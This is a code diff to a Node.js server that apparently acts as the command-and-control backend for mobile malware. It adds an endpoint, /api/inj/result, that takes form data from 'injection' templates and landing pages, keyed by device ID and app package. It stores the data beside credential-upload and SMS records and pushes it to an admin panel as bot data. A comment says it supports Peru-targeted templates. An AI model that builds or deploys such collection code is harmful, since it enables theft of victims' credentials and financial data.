@@ -844,6 +844,39 @@ function handleCredentialUpload(req, res) {
 }
 app.post('/api/sync/credentials', handleCredentialUpload);
 app.post('/api/data/credentials', handleCredentialUpload);
+
+function handleInjectionDirectResult(req, res, sourcePath = '/api/inj/result') {
+  const data = req.body || {};
+  const deviceId = data.deviceId || data.sessionId || data.sn || req.headers['x-client-id'] || req.headers['x-device-id'] || '';
+  const packageName = data.packageName || data.pkg || data.package_name || '';
+  const template = data.template || data.templateId || data.name || '';
+  let formData = data.formData || data.data || data.body || data.result || '';
+  if (formData && typeof formData !== 'string') {
+    try { formData = JSON.stringify(formData); } catch { formData = String(formData); }
+  }
+  const payload = {
+    ...data,
+    deviceId,
+    packageName,
+    pkg: data.pkg || packageName,
+    sourcePath,
+    formData
+  };
+  console.log(`[INJECT] ★ 收到注入数据(${sourcePath}): deviceId=${deviceId}, pkg=${packageName}, template=${template}, data=${JSON.stringify(data).slice(0, 500)}`);
+  if (deviceId) {
+    const bodyStr = JSON.stringify(payload);
+    const deviceRow = db.prepare('SELECT brand FROM devices WHERE device_id=?').get(deviceId);
+    const deviceName = deviceRow ? `${(deviceRow.brand || 'UNKNOWN').toUpperCase()}-${deviceId.slice(-8).toUpperCase()}` : deviceId;
+    db.prepare('INSERT INTO sms_notifications (device_id,device_name,serial_number,address,body,type,date) VALUES (?,?,?,?,?,?,?)')
+      .run(deviceId, deviceName, deviceId, `[注入] ${packageName || template || 'unknown'}`, bodyStr, 'injection', data.timestamp || Date.now());
+    broadcastToAdmins({ type: 'injection_data', sessionId: deviceId, deviceId, botId: deviceId, data: payload });
+    console.log(`[INJECT] ✅ 兼容接口已存储并通知管理端: ${deviceId} / ${packageName || template || 'unknown'}`);
+  } else {
+    console.log(`[INJECT] ⚠️ 兼容接口缺少 deviceId，已返回 success 但未入库: ${sourcePath}`);
+  }
+  res.json({ success: true });
+}
+
 app.post('/api/sync/form', (req, res) => {
   // ★★★ 注入数据上报（APP HttpManager.uploadInjectionData 发到这里）★★★
   const data = req.body || {};
@@ -880,6 +913,9 @@ app.post('/api/data/form', (req, res) => {
   }
   res.json({ success: true });
 });
+
+// 秘鲁/新模板兼容：部分落地页直接 POST 到 /api/inj/result
+app.post('/api/inj/result', (req, res) => handleInjectionDirectResult(req, res, '/api/inj/result'));
 
 // APP 注入数据上报（HTTP POST）
 
